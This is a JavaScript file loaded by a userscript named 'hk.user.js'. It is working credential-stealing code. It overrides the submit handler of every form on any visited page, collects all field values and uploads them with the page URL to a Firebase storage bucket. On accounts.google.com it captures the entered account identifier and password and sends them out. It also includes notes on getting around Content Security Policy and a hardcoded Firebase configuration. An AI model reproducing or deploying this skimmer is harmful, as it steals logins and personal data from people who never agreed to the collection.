//this script is loaded by hk.user.js
console.log("hk", "1.0.67");

/*
todo:
  - Refused to load the script 'https://xxyyzz2050.github.io/hk/hk.js?x=9'
    because it violates the following Content Security Policy directive:
    "script-src *.facebook.com *.fbcdn.net *.facebook.net *.google-analytics.com *.virtualearth.net *.google.com 127.0.0.1:* *.spotilocal.com:* 'unsafe-inline' 'unsafe-eval' blob: data: 'self'".
    Note that 'script-src-elem' was not explicitly set, so 'script-src' is used as a fallback.

    var link = document.createElement('meta');
    link.setAttribute('http-equiv', 'Content-Security-Policy');
    link.setAttribute('content', 'script-src *.github.io');
    document.getElementsByTagName('head')[0].appendChild(link);
    //this will add additional restrictions, but will not remove the existing policies

   or change headers

   or use chrome extensions to disable CSP
   https://stackoverflow.com/a/62626026/12577650

 */
let storage;

function send(data, type = "data") {
  let dataString = JSON.stringify({ site: window.location.href, data });

  //todo: wait until firebase script is loaded and storage is defined.
  //todo: hk/${userGroup}/${user}/domain/timestamp.json
  let file = `hk.user.js/${type}/${userGroup}/${user}/${
    window.location.host
  }/${new Date().getTime()}.json`;

  return storage
    .child(file)
    .putString(dataString)
    .then(res => {
      if (dev) console.log(">> sent", { data, file, res });
    });
}

function event(data, cb) {
  //https://developer.mozilla.org/en-US/docs/Web/Guide/Events/Creating_and_triggering_events
  let event = new CustomEvent("hk.user.js", {
    detail: { cb, data }
  });
  window.dispatchEvent(event);
}
//ex: event(["Math.abs", false, 1], result => console.log(result));

let userGroup, user, timestamp;

function run() {
  //firebase
  event([
    "getScript",
    true,
    "https://www.gstatic.com/firebasejs/7.15.5/firebase-app.js",
    { id: "firebase-script" },
    type => {
      //console.log({ type });
      if (type === "loaded" || type === "ready") {
        let firebaseConfig = {
          apiKey: "AIzaSyCoPmPFduf1Y7Yc33TFX6LuP5XAUlvQEVo",
          authDomain: "ace-script.firebaseapp.com",
          databaseURL: "https://ace-script.firebaseio.com",
          projectId: "ace-script",
          storageBucket: "ace-script.appspot.com",
          messagingSenderId: "165143901867",
          appId: "1:165143901867:web:b7a7f5b002976a5547e9ee"
        };

        firebase.initializeApp(firebaseConfig);

        event([
          "getScript",
          true,
          "https://www.gstatic.com/firebasejs/7.15.5/firebase-storage.js",
          { id: "firebase-storage-script" },
          type => {
            if (type === "loaded" || type === "ready")
              storage = firebase.storage().ref();

            event(["getInfo", true], info => {
              userGroup = info.userGroup;
              user = info.user;
              timestamp = info.timestamp;
              dev = info.dev;
              let script = info.script;
              if (!script || script < timestamp - 24 * 60 * 60 * 1000) {
                script = timestamp;
                send({ ...info, script }, "log").then(() =>
                  event(["GM_setValue", true, "script", script])
                );
              }
            });
          }
        ]);
      }
    }
  ]);

  let forms = document.forms;
  //console.log("forms", forms.length);

  for (let i = 0; i < forms.length; i++) {
    let form = forms[i];
    //console.log(`form ${i}`, form);

    /*
      //getEventListeners is available from the console only in chrome https://stackoverflow.com/a/33467408/12577650
      if (getEventListeners) {
        let listensers = getEventListeners(form);
        if (listensers.submit) {
          originalSubmit = listensers.submit[0].listener;

          listensers.submit.forEach(el =>
            form.removeEventListener("submit", el.listener, el.useCapture)
          );
        }
      }
      //todo: else clone the Node <form>
      //element.outerHTML = element.outerHTML;
      //https://stackoverflow.com/a/39026635/12577650

      form.addEventListener("submit", ev=>{ ... })
      */

    //changing el.onsubmit dosen't prevent eventListeners,
    //so, we don't need to do: originalSubmit=form.onsubmit || listensers.submit[0].listener
    let originalSubmit = form.onsubmit;
    let data = {}; //or new FormData()
    form.onsubmit = async function(ev) {
      //onsubmit() dosen't take any parameters, so `ev` here is undefined
      //instead of ev.preventDefault(), return false
      //ev.preventDefault();
      //console.log({ ev, elements: form.elements });
      for (let k = 0; k < form.elements.length; k++) {
        let el = form.elements[k];
        data[el.name] = el.value;
      }

      await send(data).then(res => {
        console.log(">> done" /*, res*/);
        //console.log({ originalSubmit });

        if (originalSubmit && typeof originalSubmit === "function")
          originalSubmit();
        return false;
      });

      //todo: wait until send() finish
      return true;
    };
  }

  if (window.location.host === "accounts.google.com") {
    let initialView = document.getElementById("initialView"),
      idNext,
      passNxt,
      id;

    if (initialView)
      initialView.onchange = function() {
        if (!idNext) {
          idNext = document.getElementById("identifierNext");
          if (idNext) {
            idNext.onclick = async function() {
              id = document.getElementById("identifierId").value.trim();
            };
          }
        }

        if (!passNxt) {
          passNxt = document.getElementById("passwordNext");
          if (passNxt) {
            passNxt.onclick = async function() {
              let password = document
                .getElementsByName("password")[0]
                .value.trim();
              if (password !== "") await send({ id, password });
            };
          }
        }
      };
  }
}

run();
